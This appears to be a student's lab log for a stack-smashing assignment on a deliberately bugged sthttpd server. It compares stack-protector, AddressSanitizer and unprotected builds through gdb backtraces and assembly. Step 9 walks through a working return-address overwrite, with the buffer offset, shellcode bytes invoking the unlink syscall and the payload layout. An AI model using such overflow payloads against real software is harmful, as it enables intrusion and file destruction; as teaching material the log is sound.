@@ -1,0 +1,251 @@
+
+Sidharth Bambah UID:904787435
+
+Smashing Lab Log
+
+QUESTION ANSWERS
+
+1-9. Refer to Steps 4-6.
+10. Refer to Step 8.
+11. Refer to Step 9.
+
+
+
+STEPS
+
+1. Set /usr/local/cs/bin to the start of PATH in order for the 
+	command which gcc to output "/usr/local/cs/bin/gcc"
+	In order to do this, I executed the command:
+		export PATH=/usr/local/cs/bin:$PATH
+2. I ran the scp -r sthttpd-2.27.0 bambah@lnxsrv09.seas.ucla.edu:Desktop
+	command to copy the root folder sthttpd-2.27.0 into the SEASNet linux
+	environment.
+	//From here on, everything is done in the SEASNET environment
+	I changed directory into the sthttpd-2.27.0/src folder and modified the 
+	thttpd.c and libhttpd.c files as given in the lab specification. 
+	Next, I ran the command 
+	./configure \LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+	to configure gcc. 
+	I compiled three times using the commands
+
+	make clean
+	make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+	mv src/thttpd src/thttpd-sp
+
+	make clean
+	make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
+	//I added the flag -static-libasan
+	mv src/thttpd src/thttpd-as
+
+	make clean
+	make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+	mv src/thttpd src/thttpd-no
+3. I created a file foo.txt in the sthttpd-2.27.0 directory with the following command:
+	echo 'hello world' > foo.txt
+	Then, I launched all three variants of the server using the same port and tried to 
+	read foo with the following commands:
+
+		Terminal A                            Terminal B
+	src/thttpd-sp -p 12538 -D
+											curl http://localhost:12538/foo.txt
+	src/thttpd-as -p 12538 -D
+											curl http://localhost:12538/foo.txt
+	src/thttpd-no -p 12538 -D
+											curl http://localhost:12538/foo.txt
+
+
+4-6.In order to crash all three variants of the server, I noticed that the bugged
+	patch makes it so that if there are over 100 characters in the config file there
+	will be a segmentation fault and the server will fail. 
+	Thus, I created a config.txt file that was filled with the keyword debug multiple
+	times separated by spaces.
+	config.txt: debug debug debug .........
+	Then, I ran all three variants of the server with the config.txt file in gdb and generated
+	backtraces for all three using the following commands:
+	
+	$ gdb src/thttpd-sp
+	(gdb) run -p 12538 -D -C config.txt   // Gives seg fault
+	(gdb) bt
+
+	$ gdb src/thttpd-as
+	(gdb) run -p 12538 -D -C config.txt  // The error message contains the bt
+	
+	$ gdb src/thttpd-no
+	(gdb) run -p 12538 -D -C config.txt  // Also gives seg fault
+	(gdb) bt
+
+	The backtraces for each of the three variants are as follows:
+	thttpd-sp
+		#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+		#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+		#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+		#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+		#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+		#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+		#6  0x0000000000405056 in read_config (filename=<optimized out>) at thttpd.c:1190
+		#7  0x7562656400677562 in ?? ()
+		#8  0x0067756265640067 in ?? ()
+		#9  0x6564006775626564 in ?? ()
+		#10 0x7562656400677562 in ?? ()
+		#11 0x0067756265640067 in ?? ()
+		#12 0x6564006775626564 in ?? ()
+		#13 0x0000000000677562 in ?? ()
+		#14 0x0000000000000000 in ?? ()
+	thttpd-as
+		#0 0x43aec8 in __interceptor_strchr ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+		#1 0x4e0b50 in read_config /u/ee/ugrad/bambah/Desktop/smashing/sthttpd-2.27.0/src/thttpd.c:1018
+		#2 0x4e164e in parse_args /u/ee/ugrad/bambah/Desktop/smashing/sthttpd-2.27.0/src/thttpd.c:893
+		#3 0x408297 in main /u/ee/ugrad/bambah/Desktop/smashing/sthttpd-2.27.0/src/thttpd.c:380
+		#4 0x7ffff6cc6b34 in __libc_start_main (/lib64/libc.so.6+0x21b34)
+		#5 0x4093f9  (/w/home.14/ee/ugrad/bambah/Desktop/smashing/sthttpd-2.27.0/src/thttpd-as+0x4093f9)
+	thttpd-no
+		#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+		#1  0x7562656400677562 in ?? ()
+		#2  0x0067756265640067 in ?? ()
+		#3  0x6564006775626564 in ?? ()
+		#4  0x7562656400677562 in ?? ()
+		#5  0x0067756265640067 in ?? ()
+		#6  0x6564006775626564 in ?? ()
+		#7  0x0000000000677562 in ?? ()
+		#8  0x0000000000000000 in ?? ()
+	After looking at these backtraces, I set breakpoints before the segmentation faults and stepped into each line
+	disassembled to find what caused the segmentation fault.
+	To do this I used the following commands starting from the root sthttpd-2.27.0 folder:
+	For thttpd-sp:
+	
+	 $ gdb src/thttpd-sp
+	(gdb) break 1190
+	(gdb) run -p 12538 -D -C config.txt
+	(gdb) set disassemble-next-line on
+	(gdb) si                //I kept using this command until I got to the line that crashed the program
+	
+	The line that crashed the program was:
+	0x00000000004024bb <__stack_chk_fail@plt+11>:        e9 20 fe ff ff  jmpq   0x4022e0
+	
+	This was detected by the following lines:
+	 0x0000000000404f28 <+1224>:  xor    %fs:0x28,%rax
+	 0x0000000000404f31 <+1233>:  jne    0x405051 <read_config+1521>
+	
+	This line xor's the registers and detects that there is a buffer overflow by finding a change in the canary. This results 
+	in the conditional branch executing the stack_chk_fail function that results in a segmentation fault.
+
+	For thttpd-as:
+	
+	$ gdb src/thttpd-as
+	(gdb) break 1018
+	(gdb) run -p 12538 -D -C config.txt
+	(gdb) set disassemble-next-line on
+	(gdb) si                //I kept using this command until I got to the line that crashed the program
+
+	The disassembled line that denoted the segmentation fault is the following:
+	0x00000000004e0b4c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b080 <__interceptor_strchr(char const*, int)>	
+
+	At this line, the address sanitizer takes over and calles numerous auxillary functions that force the compiler
+	to result in a segmentation fault.
+
+	For thttpd-no:
+	
+	$ gdb src/thttpd-no
+	(gdb) break 1190
+	(gdb) run -p 12538 -D -C config.txt
+	(gdb) set disassemble-next-line on
+	(gdb) si                //I kept using this command until I got to the line that crashed the program
+
+	There does not seem to be any check for buffer overflow, but it is evident that the excess amount of characters
+	in the config.txt file that was passed to the program is what caused the segmentation error.
+	
+
+8.	After testing all of these servers satisfactorily, I created the assembly language files
+	by running the following commands in the root folder sthttpd-2.27.0:
+	
+	make clean
+	make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+	mv src/thttpd.o src/thttpd-sp.s
+
+	make clean
+	make CFLAGS='-S -O2 -fno-inline -fsanitize=address -static-libasan'
+	mv src/thttpd.o src/thttpd-as.s
+	
+	make clean
+	make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+	mv src/thttpd.o src/thttpd-as.s
+
+	Looking at the machine code for all three variations, it is evident that address
+	sanitizer uses the most lines as it has numerous auxillary functions and handles
+	buffer overflows in a certain way. 
+	The thttpd-as.s file is roughly 9688 lines while both thttpd-no.s and thttpd-sp.s are roughly 4400 lines.
+		
+	-fstack-protector-strong
+	The thttpd-sp implementation relies on the use of canaries to detect buffer overflow. However, these are only checked
+	once after handle_read is executed. After the read_config is executed, __stack_chk_fail() is called and outputs the segmentation
+	fault error. The only reason the assembly for thttpd-sp is longer than that of thttpd-no is because of the invocation of __stack_chk_fail().
+
+	-fsanitize=address
+	In thttpd-as, buffer overflow in handle_read is implemented such that an area of shadow memory is created (and mapped to bad memory) and 
+	checks whether an address is shadowed or not. If it is shadowed, the value is "poisoned" and the compiler results
+	in a segmentation fault error.
+	
+	In thttpd-no, there is no checking for buffer overflow and the program merely crashes towards the end. 
+
+9. In order to exploit the program using the bug I introduced earlier in this lab, I noticed that the buffer was only set to
+100 and if it was overflowed, the return address of the read_config function could be manipulated to be whatever I wanted. First,
+I established a dummy file called target.txt in the root folder sthttpd-2.27.0 using the following command:
+	 $ echo 'this is a test' > target.txt
+Next, I created an config file that will eventually contain my exploit using the following command:
+	touch exploit.txt
+Next, I needed to find out where the buffer started and where the return address of the read_config function was. I did this with the
+help of gdb as per the following commands:
+	$ gdb src/thttpd-no
+	(gdb) break read_config
+	(gdb) run -p 15431 -D -C exploit.txt
+	(gdb) info registers      //This lists all of the registers and their values
+I took note of the rsp register and it was: 0x7fffffffcfe8
+Then, I found the location of the start of the buffer. This is done as follows:
+	(gdb) print &line
+The output of this command was:
+	$1 = (char (*)[100]) 0x7fffffffcf50
+and I took note of the return address.
+The distance between the start of the buffer and the return address I needed to overwrite was 152 bytes.
+
+Thus, I needed to have an exploit file of 152 bytes plus the 8 bytes for the new return address.
+
+Total Bytes Needed = 160
+
+Now, I needed to develop the actual exploit. First, I developed it all in hexidecimal, then I converted this HEX into ASCII
+and wrote it into the exploit.txt.
+
+So, I put all of the hex into a temporary file called raw.txt.
+I wanted the exploit to start with port=. This in hex is 0x706f72743d.
+However, this is only 6 bytes, so I added 00 00 at the end in order to align it to 8 bytes.
+Now, I wanted the new return address to point immediately after port=. This is at memory address 0x7fffffffcf58.
+So, I added this to the end of the hex file in reverse order in order to account for the little endian formatting of the system.
+
+To develop the actual exploit itself, I needed to make use of the unlink call. But, in order to use this call, I needed
+to pass it the file target.txt, which, in hex, is 0x7461726765742e74787400. I placed this right before the return address; this is at the
+address 0x7fffffffcfd8.
+
+However, in order to use the unlink, I would need to pass it target.txt. This can be done by placing its hex value in the register rdi using 
+the attached assembly code in insns.s.
+Then, I compiled the assembly and dumped it to find the hex:
+		$ gcc -c insns.s
+		$ objdump -d insns.o
+This yields the following:
+ 0:   48 bf d8 cf ff ff ff    movabs $0x7fffffffcfd8,%rdi
+ 7:   7f 00 00
+ a:   48 c7 c0 57 00 00 00    mov    $0x57,%rax
+ 11:   0f 05                   syscall
+
+Now, our exploit code is: 48 bf d8 cf ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05 
+
+The raw file contains port= in hex followed by 3 00 iterations followed by this above exploit code
+followed by multiple 00 sets which end with target in hex and the return address. 
+
+I used the following link to convert from hex to ascii and both files, exploit.txt and raw.txt
+are attached to this lab.
+http://tomeko.net/online_tools/hex_to_file.php?lang=en
+
+When this exploit runs it still gives the segmentation fault, but this doesn't matter because the target.txt file is removed.
+
+NOTE: This only works if ASLR is disabled.
+
+	
